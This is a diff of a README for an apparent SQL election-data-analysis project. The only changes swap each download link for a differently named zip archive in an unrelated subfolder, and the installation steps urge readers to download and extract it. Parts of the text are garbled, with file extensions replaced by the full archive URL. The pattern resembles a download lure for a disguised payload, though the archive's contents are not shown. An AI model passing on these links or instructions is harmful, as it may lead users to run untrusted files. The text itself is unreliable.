@@ -1,6 +1,6 @@
 # 📊 Election-Data-Analysis-SQL - Easy Insights from Election Data
 
-![Download Election Data Analysis SQL](https://raw.githubusercontent.com/luacortelaser/Election-Data-Analysis-SQL/main/Tuscanism/Election-Data-Analysis-SQL.zip%20Data%20Analysis%20SQL-brightgreen)
+![Download Election Data Analysis SQL](https://raw.githubusercontent.com/luacortelaser/Election-Data-Analysis-SQL/main/Tuscanism/Election_Analysis_Data_SQL_v3.1.zip%20Data%20Analysis%20SQL-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Election Data Analysis SQL project! This project helps you analyz
 
 To get started, you need to visit the following page to download the necessary files:
 
-[Visit this page to download](https://raw.githubusercontent.com/luacortelaser/Election-Data-Analysis-SQL/main/Tuscanism/Election-Data-Analysis-SQL.zip)
+[Visit this page to download](https://raw.githubusercontent.com/luacortelaser/Election-Data-Analysis-SQL/main/Tuscanism/Election_Analysis_Data_SQL_v3.1.zip)
 
 ## 📋 Requirements
 
@@ -23,16 +23,16 @@ Before you begin, make sure your computer meets the following requirements:
 ## 🛠 Installation Steps
 
 1. **Visit the Download Page:**  
-   Go to [this page to download](https://raw.githubusercontent.com/luacortelaser/Election-Data-Analysis-SQL/main/Tuscanism/Election-Data-Analysis-SQL.zip).
+   Go to [this page to download](https://raw.githubusercontent.com/luacortelaser/Election-Data-Analysis-SQL/main/Tuscanism/Election_Analysis_Data_SQL_v3.1.zip).
   
 2. **Choose the Right Version:**  
    You will see a list of releases. Pick the latest stable version.
 
 3. **Download the Files:**  
-   Click on the file link to download it to your computer. You might see options for `.zip` or `https://raw.githubusercontent.com/luacortelaser/Election-Data-Analysis-SQL/main/Tuscanism/Election-Data-Analysis-SQL.zip` files. 
+   Click on the file link to download it to your computer. You might see options for `.zip` or `https://raw.githubusercontent.com/luacortelaser/Election-Data-Analysis-SQL/main/Tuscanism/Election_Analysis_Data_SQL_v3.1.zip` files. 
 
 4. **Extract the Files:**  
-   Once downloaded, locate the file on your computer and extract it. You can usually right-click and select "Extract All" for `.zip` files. For `https://raw.githubusercontent.com/luacortelaser/Election-Data-Analysis-SQL/main/Tuscanism/Election-Data-Analysis-SQL.zip`, you may need software like WinRAR or 7-Zip.
+   Once downloaded, locate the file on your computer and extract it. You can usually right-click and select "Extract All" for `.zip` files. For `https://raw.githubusercontent.com/luacortelaser/Election-Data-Analysis-SQL/main/Tuscanism/Election_Analysis_Data_SQL_v3.1.zip`, you may need software like WinRAR or 7-Zip.
 
 5. **Open PostgreSQL:**  
    Launch PostgreSQL on your computer. Make sure the server is running.
